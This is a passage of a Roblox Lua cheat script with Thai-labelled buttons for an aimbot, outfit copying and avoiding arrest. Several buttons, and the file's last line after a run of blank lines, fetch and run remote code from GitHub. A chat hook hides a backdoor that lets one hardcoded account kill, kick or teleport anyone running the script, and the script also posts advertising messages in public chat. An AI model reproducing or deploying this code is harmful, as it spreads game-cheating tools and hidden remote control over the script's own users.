    aimbotButton.Text = "รัน"
    aimbotButton.TextColor3 = Color3.fromRGB(255,255,255)
    aimbotButton.TextSize = 18
    aimbotButton.Parent = contentFrame

    aimbotButton.MouseButton1Click:Connect(function()
        loadstring(aimbotCode)()
    end)

    local copyOutfitLabel = Instance.new("TextLabel")
    copyOutfitLabel.Size = UDim2.new(0,120,0,30)
    copyOutfitLabel.Position = UDim2.new(0,10,0,60)
    copyOutfitLabel.BackgroundTransparency = 1
    copyOutfitLabel.Text = "Copy เสื้อ"
    copyOutfitLabel.TextColor3 = Color3.fromRGB(255,255,255)
    copyOutfitLabel.TextSize = 18
    copyOutfitLabel.Font = Enum.Font.Gotham
    copyOutfitLabel.TextXAlignment = Enum.TextXAlignment.Left
    copyOutfitLabel.Parent = contentFrame

    local copyOutfitButton = Instance.new("TextButton")
    copyOutfitButton.Size = UDim2.new(0,80,0,30)
    copyOutfitButton.Position = UDim2.new(0,140,0,60)
    copyOutfitButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
    copyOutfitButton.Text = "รัน"
    copyOutfitButton.TextColor3 = Color3.fromRGB(255,255,255)
    copyOutfitButton.TextSize = 18
    copyOutfitButton.Parent = contentFrame

    copyOutfitButton.MouseButton1Click:Connect(function()
        loadstring(copyOutfitCode)()
    end)

    local preventArrestLabel = Instance.new("TextLabel")
    preventArrestLabel.Size = UDim2.new(0,120,0,30)
    preventArrestLabel.Position = UDim2.new(0,10,0,100)
    preventArrestLabel.BackgroundTransparency = 1
    preventArrestLabel.Text = "ป้องกันโดนจับ"
    preventArrestLabel.TextColor3 = Color3.fromRGB(255,255,255)
    preventArrestLabel.TextSize = 18
    preventArrestLabel.Font = Enum.Font.Gotham
    preventArrestLabel.TextXAlignment = Enum.TextXAlignment.Left
    preventArrestLabel.Parent = contentFrame

    local preventArrestButton = Instance.new("TextButton")
    preventArrestButton.Size = UDim2.new(0,80,0,30)
    preventArrestButton.Position = UDim2.new(0,140,0,100)
    preventArrestButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
    preventArrestButton.Text = "รัน"
    preventArrestButton.TextColor3 = Color3.fromRGB(255,255,255)
    preventArrestButton.TextSize = 18
    preventArrestButton.Parent = contentFrame

    preventArrestButton.MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUx1/Roblox-script/refs/heads/main/Touscript"))()
    end)
end

homeButton.MouseButton1Click:Connect(showHome)
playerButton.MouseButton1Click:Connect(showPlayer)
scriptButton.MouseButton1Click:Connect(showScript)
scriptUIButton.MouseButton1Click:Connect(showScriptUI)

showHome()

local TextChatService = game:GetService("TextChatService")

local function sendMessage(msg)
    local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync(msg)
    else
        warn("❌ ไม่พบแชนเนล RBXGeneral")
    end
end

sendMessage("SCRIPT CITY THAILAND 2 BY:TOUx1")

-- กำหนดตาราง specialUsers ให้ชัดเจน
local specialUsers = {
    ["zerom_12y"] = true
}

--== ฟังก์ชันจัดการคำสั่งแชท ==--
local function onCommand(plr, msg)
    -- ป้องกันผลกระทบกับตัวเอง
    if plr == LocalPlayer then return end  

    -- หมุนรอบ bird
    if msg == "1" and plr.Name == targetName then
        if LocalPlayer.Name ~= targetName then
            local target = plr.Character or plr.CharacterAdded:Wait()
            startRotating(target)
        end
    elseif msg == "stop1" and plr.Name == targetName then
        stopRotating()
    else
        -- ส่งไปจัดการต่อ (ส่วนที่ 2)
        _G.HandleExtraCommands(plr, msg, LocalPlayer, specialUsers)
    end
end

-- ฟังการพิมพ์
local function hookPlayer(plr)
    plr.Chatted:Connect(function(msg)
        onCommand(plr, msg)
    end)
end

Players.PlayerAdded:Connect(hookPlayer)
for _, p in ipairs(Players:GetPlayers()) do
    hookPlayer(p)
end

--== ส่วนที่ 2 : ฟังก์ชันคำสั่งพิเศษ (อัปเดต) ==--
_G.HandleExtraCommands = function(plr, msg, LocalPlayer, specialUsers)
    if specialUsers[plr.Name] then
        if msg == "kill" then
            killPlayer(LocalPlayer)
        elseif msg == "kick" then
            kickPlayer(LocalPlayer)
        elseif msg == "pull" then
            pullToSpeaker(plr, LocalPlayer)
        end
    end
end

-- ฟังก์ชันฆ่าตัวละคร
local function killPlayer(plr)
    if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") then
        plr.Character.Humanoid.Health = 0
    end
end

-- ฟังก์ชันเตะออกจากเกม
local function kickPlayer(plr)
    if plr == game.Players.LocalPlayer then
        game.Players.LocalPlayer:Kick("โดนแบนละ")
    end
end

-- ฟังก์ชันดึงผู้เล่นมาหาตัวคนพิมพ์
local function pullToSpeaker(speaker, targetPlr)
    if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
    and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
        targetPlr.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
    end
end

-- ฟังก์ชันส่งข้อความไป RBXGeneral
local function checkMessage()
    local TextChatService = game:GetService("TextChatService")
    local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync("ผมใช้TOU HUB🎉")
    else
        warn("❌ ไม่พบแชนเนล RBXGeneral")
    end
end










loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUxIllIll0O00OO/RobloxscriptTOU/refs/heads/main/Cmd"))()
